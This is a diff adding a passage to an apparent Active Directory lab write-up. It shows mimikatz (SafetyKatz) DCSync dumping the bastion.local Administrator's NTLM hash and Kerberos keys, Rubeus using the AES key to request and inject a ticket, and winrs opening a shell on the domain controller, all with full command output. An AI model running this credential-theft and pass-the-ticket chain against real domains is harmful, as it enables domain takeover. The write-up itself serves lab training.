@@ -203,3 +203,168 @@ UplevelOnly             : False
 UsesAESKeys             : False
 UsesRC4Encryption       : False
 ```
+Use the permissions on the same terminal of adminstrator to dump lsa creds of bstion-dc:
+
+```
+exit
+exit
+C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:bastion\Administrator /domain:bastion.local" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::dcsync /user:bastion\Administrator /domain:bastion.local
+[DC] 'bastion.local' will be the domain
+[DC] 'Bastion-DC.bastion.local' will be the DC server
+[DC] 'bastion\Administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 7/12/2019 9:49:56 PM
+Object Security ID   : S-1-5-21-284138346-1733301406-1958478260-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: f29207796c9e6829aa1882b7cccfa36d
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 31b615437127e4a4badbea412c32e37f
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : BASTION-DCAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292
+      aes128_hmac       (4096) : e8679f4d4ed30fe9d2aeabb8b5e5398e
+      des_cbc_md5       (4096) : 869b5101a43d73f2
+    OldCredentials
+      aes256_hmac       (4096) : cf6744ea466302f40e4e56d056ebc647e57c8a89ab0bc6a747c51945bdcba381
+      aes128_hmac       (4096) : 709452c5ffe4e274fc731903a63c9148
+      des_cbc_md5       (4096) : 29ef1ce323bac8a8
+    OlderCredentials
+      aes256_hmac       (4096) : 6ee5d99e81fd6bdd2908243ef1111736132f4b107822e4eebf23a18ded385e61
+      aes128_hmac       (4096) : 6508ee108b9737e83f289d79ea365151
+      des_cbc_md5       (4096) : 31435d975783d0d0
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : BASTION-DCAdministrator
+    Credentials
+      des_cbc_md5       : 869b5101a43d73f2
+    OldCredentials
+      des_cbc_md5       : 29ef1ce323bac8a8
+
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+Using Rubeus to create a new TGT  for administrator user of bastion.local:
+
+```
+C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /domain:bastion.local /user:administrator /aes256:a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292 /dc:bastion-dc.bastion.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Showing process : True
+[*] Username        : CJRQ1PBV
+[*] Domain          : 2T3F8QTS
+[*] Password        : CDP86QGS
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4308
+[+] LUID            : 0xc045a13
+
+[*] Using aes256_cts_hmac_sha1 hash: a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292
+[*] Building AS-REQ (w/ preauth) for: 'bastion.local\administrator'
+[*] Target LUID : 201611795
+[*] Using domain controller: 192.168.101.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+      DWJhc3Rpb24ubG9jYWw=
+[*] Target LUID: 0xc045a13
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/bastion.local
+  ServiceRealm             :  BASTION.LOCAL
+  UserName                 :  administrator
+  UserRealm                :  BASTION.LOCAL
+  StartTime                :  3/4/2023 12:59:32 PM
+  EndTime                  :  3/4/2023 10:59:32 PM
+  RenewTill                :  3/11/2023 12:59:32 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  FzbMGCvjJNESjjzqHwBgduEeBRWbhvTB9VF0u0rEhek=
+  ASREP (key)              :  A32D8D07A45E115FA499CF58A2D98EF5BF49717AF58BC4961C94C3C95FC03292
+```
+Validation:
+
+```
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>winrs -r:bastion-dc.bastion.local cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>hostname
+hostname
+Bastion-DC
+
+C:\Users\Administrator>whoami
+whoami
+bastion\administrator
+
+C:\Users\Administrator>
+
+```
